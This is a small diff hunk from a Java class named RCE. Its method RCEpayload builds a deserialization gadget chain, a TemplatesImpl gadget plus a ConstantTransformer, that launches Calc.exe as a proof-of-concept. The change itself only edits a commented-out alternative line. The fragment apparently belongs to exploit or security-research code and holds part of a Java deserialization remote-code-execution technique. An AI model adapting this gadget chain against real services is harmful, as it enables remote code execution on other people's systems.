@@ -56,7 +56,7 @@ public class RCE {
   private static byte[] RCEpayload() throws Exception {
 
     Object templates = Gadgets.createTemplatesImpl("Calc.exe");
-    // Object templates = Gadgets.createTemplatesImpl("write .gitignore"); 
+    // Object templates = Gadgets.createExecBytecodes("write .gitignore");
 
     ConstantTransformer<Object, Class<String>> constant = new ConstantTransformer<>(String.class);
 
